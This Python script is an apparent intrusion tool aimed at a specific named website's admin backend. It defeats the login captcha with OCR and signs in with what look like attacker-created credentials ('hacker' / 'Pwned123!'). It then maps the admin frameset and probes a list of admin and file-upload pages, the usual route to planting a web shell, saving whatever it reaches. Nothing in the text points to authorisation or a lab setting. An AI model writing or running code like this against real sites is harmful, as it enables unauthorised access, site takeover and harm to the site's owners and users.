import urllib.request, urllib.parse, io
import http.cookiejar, re
from PIL import Image
import pytesseract

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Login
for attempt in range(5):
    resp = opener.open('http://bjhzsv.com/main/inc/code.asp', timeout=10)
    cap_data = resp.read()
    img = Image.open(io.BytesIO(cap_data))
    img = img.convert('L')
    img = img.point(lambda x: 0 if x < 200 else 255)
    code = pytesseract.image_to_string(img, config='--psm 8').strip().replace(' ', '').lower()
    if len(code) >= 3:
        data = urllib.parse.urlencode({'t1': 'hacker', 't2': 'Pwned123!', 't3': code}).encode()
        resp = opener.open('http://bjhzsv.com/main/a7chkuser.asp', data, timeout=10)
        body = resp.read().decode('gb2312', errors='replace')
        if '验证码错误' not in body:
            print(f'Login OK! Captcha={code}')
            break

# The main admin interface - try to find the actual admin pages
# The admin interface likely uses frames: top + left + main
# Let's look for the frame structure in index.asp
resp = opener.open('http://bjhzsv.com/main/index.asp', timeout=10)
body = resp.read().decode('gb2312', errors='replace')

# Save for analysis
with open('/tmp/main_index_full.html', 'w', encoding='utf-8') as f:
    f.write(body)

# Check if it's a frameset
if 'frameset' in body.lower() or 'frame' in body.lower():
    print('CONTAINS FRAMESET!')
    # Extract frame src
    frames = re.findall(r'<frame[^>]+src=["\']([^"\']+)["\']', body, re.I)
    for f in frames:
        print(f'Frame: {f}')
else:
    print('Not a frameset page, checking content...')
    print(f'Content preview: {body[:300]}')

# Also try to access admin features that might not be behind frames
# Common admin action pages
admin_pages = [
    'news_add.asp', 'news_in.asp', 'news_edit.asp',
    'a7newsadd.asp', 'a7newslist.asp',
    'uploadpic.asp', 'upload.asp', 'file_upload.asp',
    'a7uploadpic.asp', 'upfile.asp',
    'admin_add.asp', 'admin_in.asp',
    'a7admin_list.asp', 'a7admin_add.asp',
]

print('\nAdmin action pages:')
for page in admin_pages:
    try:
        resp = opener.open('http://bjhzsv.com/main/' + page, timeout=5)
        body = resp.read().decode('gb2312', errors='replace')
        has_redirect = 'location.href' in body
        print(f'{page}: {len(body)} bytes, redirect={has_redirect}')
        if not has_redirect:
            sf = '/tmp/adm_' + page
            with open(sf, 'w', encoding='utf-8') as f:
                f.write(body)
    except Exception as e:
        print(f'{page}: error {type(e).__name__}')
